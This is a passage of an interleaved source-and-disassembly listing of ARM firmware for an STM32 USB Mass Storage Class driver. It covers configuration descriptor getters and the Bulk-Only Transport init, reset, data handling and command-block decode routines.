    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 80093e2:	68bb      	ldr	r3, [r7, #8]
 80093e4:	2200      	movs	r2, #0
 80093e6:	711a      	strb	r2, [r3, #4]
 80093e8:	2200      	movs	r2, #0
 80093ea:	f042 0202 	orr.w	r2, r2, #2
 80093ee:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80093f0:	687b      	ldr	r3, [r7, #4]
 80093f2:	2220      	movs	r2, #32
 80093f4:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80093f6:	4b02      	ldr	r3, [pc, #8]	; (8009400 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 80093f8:	4618      	mov	r0, r3
 80093fa:	3710      	adds	r7, #16
 80093fc:	46bd      	mov	sp, r7
 80093fe:	bd80      	pop	{r7, pc}
 8009400:	200000e0 	.word	0x200000e0

08009404 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009404:	b580      	push	{r7, lr}
 8009406:	b084      	sub	sp, #16
 8009408:	af00      	add	r7, sp, #0
 800940a:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 800940c:	2181      	movs	r1, #129	; 0x81
 800940e:	4812      	ldr	r0, [pc, #72]	; (8009458 <USBD_MSC_GetFSCfgDesc+0x54>)
 8009410:	f002 f99c 	bl	800b74c <USBD_GetEpDesc>
 8009414:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 8009416:	2101      	movs	r1, #1
 8009418:	480f      	ldr	r0, [pc, #60]	; (8009458 <USBD_MSC_GetFSCfgDesc+0x54>)
 800941a:	f002 f997 	bl	800b74c <USBD_GetEpDesc>
 800941e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009420:	68fb      	ldr	r3, [r7, #12]
 8009422:	2b00      	cmp	r3, #0
 8009424:	d006      	beq.n	8009434 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009426:	68fb      	ldr	r3, [r7, #12]
 8009428:	2200      	movs	r2, #0
 800942a:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800942e:	711a      	strb	r2, [r3, #4]
 8009430:	2200      	movs	r2, #0
 8009432:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009434:	68bb      	ldr	r3, [r7, #8]
 8009436:	2b00      	cmp	r3, #0
 8009438:	d006      	beq.n	8009448 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800943a:	68bb      	ldr	r3, [r7, #8]
 800943c:	2200      	movs	r2, #0
 800943e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009442:	711a      	strb	r2, [r3, #4]
 8009444:	2200      	movs	r2, #0
 8009446:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009448:	687b      	ldr	r3, [r7, #4]
 800944a:	2220      	movs	r2, #32
 800944c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800944e:	4b02      	ldr	r3, [pc, #8]	; (8009458 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009450:	4618      	mov	r0, r3
 8009452:	3710      	adds	r7, #16
 8009454:	46bd      	mov	sp, r7
 8009456:	bd80      	pop	{r7, pc}
 8009458:	200000e0 	.word	0x200000e0

0800945c <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 800945c:	b580      	push	{r7, lr}
 800945e:	b084      	sub	sp, #16
 8009460:	af00      	add	r7, sp, #0
 8009462:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009464:	2181      	movs	r1, #129	; 0x81
 8009466:	4812      	ldr	r0, [pc, #72]	; (80094b0 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009468:	f002 f970 	bl	800b74c <USBD_GetEpDesc>
 800946c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800946e:	2101      	movs	r1, #1
 8009470:	480f      	ldr	r0, [pc, #60]	; (80094b0 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009472:	f002 f96b 	bl	800b74c <USBD_GetEpDesc>
 8009476:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009478:	68fb      	ldr	r3, [r7, #12]
 800947a:	2b00      	cmp	r3, #0
 800947c:	d006      	beq.n	800948c <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800947e:	68fb      	ldr	r3, [r7, #12]
 8009480:	2200      	movs	r2, #0
 8009482:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009486:	711a      	strb	r2, [r3, #4]
 8009488:	2200      	movs	r2, #0
 800948a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800948c:	68bb      	ldr	r3, [r7, #8]
 800948e:	2b00      	cmp	r3, #0
 8009490:	d006      	beq.n	80094a0 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009492:	68bb      	ldr	r3, [r7, #8]
 8009494:	2200      	movs	r2, #0
 8009496:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800949a:	711a      	strb	r2, [r3, #4]
 800949c:	2200      	movs	r2, #0
 800949e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80094a0:	687b      	ldr	r3, [r7, #4]
 80094a2:	2220      	movs	r2, #32
 80094a4:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80094a6:	4b02      	ldr	r3, [pc, #8]	; (80094b0 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 80094a8:	4618      	mov	r0, r3
 80094aa:	3710      	adds	r7, #16
 80094ac:	46bd      	mov	sp, r7
 80094ae:	bd80      	pop	{r7, pc}
 80094b0:	200000e0 	.word	0x200000e0

080094b4 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 80094b4:	b480      	push	{r7}
 80094b6:	b083      	sub	sp, #12
 80094b8:	af00      	add	r7, sp, #0
 80094ba:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 80094bc:	687b      	ldr	r3, [r7, #4]
 80094be:	220a      	movs	r2, #10
 80094c0:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 80094c2:	4b03      	ldr	r3, [pc, #12]	; (80094d0 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 80094c4:	4618      	mov	r0, r3
 80094c6:	370c      	adds	r7, #12
 80094c8:	46bd      	mov	sp, r7
 80094ca:	f85d 7b04 	ldr.w	r7, [sp], #4
 80094ce:	4770      	bx	lr
 80094d0:	20000100 	.word	0x20000100

080094d4 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 80094d4:	b480      	push	{r7}
 80094d6:	b083      	sub	sp, #12
 80094d8:	af00      	add	r7, sp, #0
 80094da:	6078      	str	r0, [r7, #4]
 80094dc:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 80094de:	683b      	ldr	r3, [r7, #0]
 80094e0:	2b00      	cmp	r3, #0
 80094e2:	d101      	bne.n	80094e8 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 80094e4:	2303      	movs	r3, #3
 80094e6:	e009      	b.n	80094fc <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 80094e8:	687b      	ldr	r3, [r7, #4]
 80094ea:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80094ee:	687a      	ldr	r2, [r7, #4]
 80094f0:	33b0      	adds	r3, #176	; 0xb0
 80094f2:	009b      	lsls	r3, r3, #2
 80094f4:	4413      	add	r3, r2
 80094f6:	683a      	ldr	r2, [r7, #0]
 80094f8:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 80094fa:	2300      	movs	r3, #0
}
 80094fc:	4618      	mov	r0, r3
 80094fe:	370c      	adds	r7, #12
 8009500:	46bd      	mov	sp, r7
 8009502:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009506:	4770      	bx	lr

08009508 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 8009508:	b580      	push	{r7, lr}
 800950a:	b084      	sub	sp, #16
 800950c:	af00      	add	r7, sp, #0
 800950e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009510:	687b      	ldr	r3, [r7, #4]
 8009512:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009516:	687b      	ldr	r3, [r7, #4]
 8009518:	32b0      	adds	r2, #176	; 0xb0
 800951a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800951e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009520:	68fb      	ldr	r3, [r7, #12]
 8009522:	2b00      	cmp	r3, #0
 8009524:	d039      	beq.n	800959a <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 8009526:	68fb      	ldr	r3, [r7, #12]
 8009528:	2200      	movs	r2, #0
 800952a:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 800952c:	68fb      	ldr	r3, [r7, #12]
 800952e:	2200      	movs	r2, #0
 8009530:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 8009532:	68fb      	ldr	r3, [r7, #12]
 8009534:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009538:	2200      	movs	r2, #0
 800953a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 800953e:	68fb      	ldr	r3, [r7, #12]
 8009540:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009544:	2200      	movs	r2, #0
 8009546:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800954a:	68fb      	ldr	r3, [r7, #12]
 800954c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009550:	2200      	movs	r2, #0
 8009552:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 8009556:	687b      	ldr	r3, [r7, #4]
 8009558:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800955c:	687a      	ldr	r2, [r7, #4]
 800955e:	33b0      	adds	r3, #176	; 0xb0
 8009560:	009b      	lsls	r3, r3, #2
 8009562:	4413      	add	r3, r2
 8009564:	685b      	ldr	r3, [r3, #4]
 8009566:	681b      	ldr	r3, [r3, #0]
 8009568:	2000      	movs	r0, #0
 800956a:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 800956c:	4b0d      	ldr	r3, [pc, #52]	; (80095a4 <MSC_BOT_Init+0x9c>)
 800956e:	781b      	ldrb	r3, [r3, #0]
 8009570:	4619      	mov	r1, r3
 8009572:	6878      	ldr	r0, [r7, #4]
 8009574:	f003 fc8a 	bl	800ce8c <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 8009578:	4b0b      	ldr	r3, [pc, #44]	; (80095a8 <MSC_BOT_Init+0xa0>)
 800957a:	781b      	ldrb	r3, [r3, #0]
 800957c:	4619      	mov	r1, r3
 800957e:	6878      	ldr	r0, [r7, #4]
 8009580:	f003 fc84 	bl	800ce8c <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009584:	4b07      	ldr	r3, [pc, #28]	; (80095a4 <MSC_BOT_Init+0x9c>)
 8009586:	7819      	ldrb	r1, [r3, #0]
 8009588:	68fb      	ldr	r3, [r7, #12]
 800958a:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800958e:	3210      	adds	r2, #16
 8009590:	231f      	movs	r3, #31
 8009592:	6878      	ldr	r0, [r7, #4]
 8009594:	f003 fdb8 	bl	800d108 <USBD_LL_PrepareReceive>
 8009598:	e000      	b.n	800959c <MSC_BOT_Init+0x94>
    return;
 800959a:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800959c:	3710      	adds	r7, #16
 800959e:	46bd      	mov	sp, r7
 80095a0:	bd80      	pop	{r7, pc}
 80095a2:	bf00      	nop
 80095a4:	2000010b 	.word	0x2000010b
 80095a8:	2000010a 	.word	0x2000010a

080095ac <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 80095ac:	b580      	push	{r7, lr}
 80095ae:	b084      	sub	sp, #16
 80095b0:	af00      	add	r7, sp, #0
 80095b2:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095b4:	687b      	ldr	r3, [r7, #4]
 80095b6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095ba:	687b      	ldr	r3, [r7, #4]
 80095bc:	32b0      	adds	r2, #176	; 0xb0
 80095be:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095c2:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095c4:	68fb      	ldr	r3, [r7, #12]
 80095c6:	2b00      	cmp	r3, #0
 80095c8:	d01c      	beq.n	8009604 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 80095ca:	68fb      	ldr	r3, [r7, #12]
 80095cc:	2200      	movs	r2, #0
 80095ce:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 80095d0:	68fb      	ldr	r3, [r7, #12]
 80095d2:	2201      	movs	r2, #1
 80095d4:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 80095d6:	4b0d      	ldr	r3, [pc, #52]	; (800960c <MSC_BOT_Reset+0x60>)
 80095d8:	781b      	ldrb	r3, [r3, #0]
 80095da:	4619      	mov	r1, r3
 80095dc:	6878      	ldr	r0, [r7, #4]
 80095de:	f003 fcc1 	bl	800cf64 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 80095e2:	4b0b      	ldr	r3, [pc, #44]	; (8009610 <MSC_BOT_Reset+0x64>)
 80095e4:	781b      	ldrb	r3, [r3, #0]
 80095e6:	4619      	mov	r1, r3
 80095e8:	6878      	ldr	r0, [r7, #4]
 80095ea:	f003 fcbb 	bl	800cf64 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80095ee:	4b08      	ldr	r3, [pc, #32]	; (8009610 <MSC_BOT_Reset+0x64>)
 80095f0:	7819      	ldrb	r1, [r3, #0]
 80095f2:	68fb      	ldr	r3, [r7, #12]
 80095f4:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80095f8:	3210      	adds	r2, #16
 80095fa:	231f      	movs	r3, #31
 80095fc:	6878      	ldr	r0, [r7, #4]
 80095fe:	f003 fd83 	bl	800d108 <USBD_LL_PrepareReceive>
 8009602:	e000      	b.n	8009606 <MSC_BOT_Reset+0x5a>
    return;
 8009604:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009606:	3710      	adds	r7, #16
 8009608:	46bd      	mov	sp, r7
 800960a:	bd80      	pop	{r7, pc}
 800960c:	2000010a 	.word	0x2000010a
 8009610:	2000010b 	.word	0x2000010b

08009614 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009614:	b480      	push	{r7}
 8009616:	b085      	sub	sp, #20
 8009618:	af00      	add	r7, sp, #0
 800961a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800961c:	687b      	ldr	r3, [r7, #4]
 800961e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009622:	687b      	ldr	r3, [r7, #4]
 8009624:	32b0      	adds	r2, #176	; 0xb0
 8009626:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800962a:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 800962c:	68fb      	ldr	r3, [r7, #12]
 800962e:	2b00      	cmp	r3, #0
 8009630:	d002      	beq.n	8009638 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 8009632:	68fb      	ldr	r3, [r7, #12]
 8009634:	2200      	movs	r2, #0
 8009636:	721a      	strb	r2, [r3, #8]
  }
}
 8009638:	bf00      	nop
 800963a:	3714      	adds	r7, #20
 800963c:	46bd      	mov	sp, r7
 800963e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009642:	4770      	bx	lr

08009644 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009644:	b580      	push	{r7, lr}
 8009646:	b084      	sub	sp, #16
 8009648:	af00      	add	r7, sp, #0
 800964a:	6078      	str	r0, [r7, #4]
 800964c:	460b      	mov	r3, r1
 800964e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009650:	687b      	ldr	r3, [r7, #4]
 8009652:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009656:	687b      	ldr	r3, [r7, #4]
 8009658:	32b0      	adds	r2, #176	; 0xb0
 800965a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800965e:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009660:	68fb      	ldr	r3, [r7, #12]
 8009662:	2b00      	cmp	r3, #0
 8009664:	d022      	beq.n	80096ac <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009666:	68fb      	ldr	r3, [r7, #12]
 8009668:	7a1b      	ldrb	r3, [r3, #8]
 800966a:	2b02      	cmp	r3, #2
 800966c:	d005      	beq.n	800967a <MSC_BOT_DataIn+0x36>
 800966e:	2b02      	cmp	r3, #2
 8009670:	db1e      	blt.n	80096b0 <MSC_BOT_DataIn+0x6c>
 8009672:	3b03      	subs	r3, #3
 8009674:	2b01      	cmp	r3, #1
 8009676:	d81b      	bhi.n	80096b0 <MSC_BOT_DataIn+0x6c>
 8009678:	e013      	b.n	80096a2 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800967a:	68fb      	ldr	r3, [r7, #12]
 800967c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009680:	7f59      	ldrb	r1, [r3, #29]
 8009682:	68fb      	ldr	r3, [r7, #12]
 8009684:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009688:	331f      	adds	r3, #31
 800968a:	461a      	mov	r2, r3
 800968c:	6878      	ldr	r0, [r7, #4]
 800968e:	f000 f9e5 	bl	8009a5c <SCSI_ProcessCmd>
 8009692:	4603      	mov	r3, r0
 8009694:	2b00      	cmp	r3, #0
 8009696:	da0d      	bge.n	80096b4 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009698:	2101      	movs	r1, #1
 800969a:	6878      	ldr	r0, [r7, #4]
 800969c:	f000 f920 	bl	80098e0 <MSC_BOT_SendCSW>
      }
      break;
 80096a0:	e008      	b.n	80096b4 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80096a2:	2100      	movs	r1, #0
 80096a4:	6878      	ldr	r0, [r7, #4]
 80096a6:	f000 f91b 	bl	80098e0 <MSC_BOT_SendCSW>
      break;
 80096aa:	e004      	b.n	80096b6 <MSC_BOT_DataIn+0x72>
    return;
 80096ac:	bf00      	nop
 80096ae:	e002      	b.n	80096b6 <MSC_BOT_DataIn+0x72>

    default:
      break;
 80096b0:	bf00      	nop
 80096b2:	e000      	b.n	80096b6 <MSC_BOT_DataIn+0x72>
      break;
 80096b4:	bf00      	nop
  }
}
 80096b6:	3710      	adds	r7, #16
 80096b8:	46bd      	mov	sp, r7
 80096ba:	bd80      	pop	{r7, pc}

080096bc <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80096bc:	b580      	push	{r7, lr}
 80096be:	b084      	sub	sp, #16
 80096c0:	af00      	add	r7, sp, #0
 80096c2:	6078      	str	r0, [r7, #4]
 80096c4:	460b      	mov	r3, r1
 80096c6:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096c8:	687b      	ldr	r3, [r7, #4]
 80096ca:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096ce:	687b      	ldr	r3, [r7, #4]
 80096d0:	32b0      	adds	r2, #176	; 0xb0
 80096d2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096d6:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80096d8:	68fb      	ldr	r3, [r7, #12]
 80096da:	2b00      	cmp	r3, #0
 80096dc:	d01e      	beq.n	800971c <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 80096de:	68fb      	ldr	r3, [r7, #12]
 80096e0:	7a1b      	ldrb	r3, [r3, #8]
 80096e2:	2b00      	cmp	r3, #0
 80096e4:	d002      	beq.n	80096ec <MSC_BOT_DataOut+0x30>
 80096e6:	2b01      	cmp	r3, #1
 80096e8:	d004      	beq.n	80096f4 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 80096ea:	e01a      	b.n	8009722 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 80096ec:	6878      	ldr	r0, [r7, #4]
 80096ee:	f000 f81b 	bl	8009728 <MSC_BOT_CBW_Decode>
      break;
 80096f2:	e016      	b.n	8009722 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80096f4:	68fb      	ldr	r3, [r7, #12]
 80096f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096fa:	7f59      	ldrb	r1, [r3, #29]
 80096fc:	68fb      	ldr	r3, [r7, #12]
 80096fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009702:	331f      	adds	r3, #31
 8009704:	461a      	mov	r2, r3
 8009706:	6878      	ldr	r0, [r7, #4]
 8009708:	f000 f9a8 	bl	8009a5c <SCSI_ProcessCmd>
 800970c:	4603      	mov	r3, r0
 800970e:	2b00      	cmp	r3, #0
 8009710:	da06      	bge.n	8009720 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009712:	2101      	movs	r1, #1
 8009714:	6878      	ldr	r0, [r7, #4]
 8009716:	f000 f8e3 	bl	80098e0 <MSC_BOT_SendCSW>
      break;
 800971a:	e001      	b.n	8009720 <MSC_BOT_DataOut+0x64>
    return;
 800971c:	bf00      	nop
 800971e:	e000      	b.n	8009722 <MSC_BOT_DataOut+0x66>
      break;
 8009720:	bf00      	nop
  }
}
 8009722:	3710      	adds	r7, #16
 8009724:	46bd      	mov	sp, r7
 8009726:	bd80      	pop	{r7, pc}

08009728 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 8009728:	b580      	push	{r7, lr}
 800972a:	b084      	sub	sp, #16
 800972c:	af00      	add	r7, sp, #0
 800972e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009730:	687b      	ldr	r3, [r7, #4]
 8009732:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009736:	687b      	ldr	r3, [r7, #4]
 8009738:	32b0      	adds	r2, #176	; 0xb0
 800973a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800973e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009740:	68fb      	ldr	r3, [r7, #12]
 8009742:	2b00      	cmp	r3, #0
 8009744:	f000 8085 	beq.w	8009852 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009748:	68fb      	ldr	r3, [r7, #12]
 800974a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800974e:	695b      	ldr	r3, [r3, #20]
 8009750:	68fa      	ldr	r2, [r7, #12]
 8009752:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009756:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 8009758:	68fb      	ldr	r3, [r7, #12]
 800975a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800975e:	699b      	ldr	r3, [r3, #24]
 8009760:	68fa      	ldr	r2, [r7, #12]
 8009762:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009766:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009768:	4b3d      	ldr	r3, [pc, #244]	; (8009860 <MSC_BOT_CBW_Decode+0x138>)
 800976a:	781b      	ldrb	r3, [r3, #0]
 800976c:	4619      	mov	r1, r3
 800976e:	6878      	ldr	r0, [r7, #4]
 8009770:	f003 fd02 	bl	800d178 <USBD_LL_GetRxDataSize>
 8009774:	4603      	mov	r3, r0
 8009776:	2b1f      	cmp	r3, #31
 8009778:	d118      	bne.n	80097ac <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
